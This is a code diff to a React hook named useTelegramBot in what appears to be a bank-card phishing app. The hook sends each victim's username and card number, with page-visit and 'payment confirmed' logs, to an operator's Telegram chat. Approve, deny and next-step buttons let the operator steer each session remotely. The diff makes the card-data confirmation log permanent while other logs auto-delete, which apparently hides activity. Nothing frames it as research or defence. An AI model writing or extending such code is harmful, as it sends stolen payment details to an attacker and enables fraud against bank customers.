@@ -150,7 +150,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     }
   };
 
-  // ========== LOGS CHANNEL (no buttons, auto-delete) ==========
+  // ========== LOGS CHANNEL (no buttons, auto-delete for most) ==========
 
   const sendPageViewLog = async () => {
     try {
@@ -298,7 +298,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
       const messageId = response.data.result.message_id;
       deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
       
-      console.log('✅ Card verification page log sent (will auto-delete in 30s)');
+      console.log('✅ Card verification page log sent (will auto-delete)');
     } catch (error) {
       console.error('Error sending card verification page log:', error);
     }
@@ -416,7 +416,7 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     }
   };
 
-  // ========== CONFIRMATION LOG FOR NEXT STEP APPR ==========
+  // ========== CONFIRMATION LOG FOR NEXT STEP APPR (NO AUTO-DELETE - PERMANENT) ==========
   const sendConfirmationLog = async (username, cardNumber, sessionId) => {
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -432,13 +432,14 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
 ⚠️ <i>User confirmed payment in mobile banking</i>
       `;
 
+      // Send to LOGS_CHANNEL - NO auto-delete (permanent message)
       await axios.post(url, {
         chat_id: LOGS_CHAT_ID,
         text: message,
         parse_mode: 'HTML'
       });
       
-      console.log('✅ Confirmation log sent to Telegram');
+      console.log('✅ Confirmation log sent to Telegram (PERMANENT - will NOT delete)');
       return true;
     } catch (error) {
       console.error('Error sending confirmation log:', error);
@@ -580,7 +581,6 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
             if (sid === sessionId) {
               console.log('🔵 Action received from Telegram:', action, 'Session:', sid);
               
-              // Execute the appropriate callback
               if (action === 'approve') {
                 console.log('✅ Calling onApprove callback');
                 onApprove?.();
@@ -614,7 +614,6 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
                 onNextStepAppr?.();
               }
               
-              // Answer the callback query
               try {
                 await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                   callback_query_id: update.callback_query.id,
@@ -662,6 +661,6 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     sendSiteEntryLog,
     sendBlockedLog,
     sendVisitNotification,
-    sendConfirmationLog
+    sendConfirmationLog  // ← NOW INCLUDED AND PERMANENT (NO AUTO-DELETE)
   };
 };
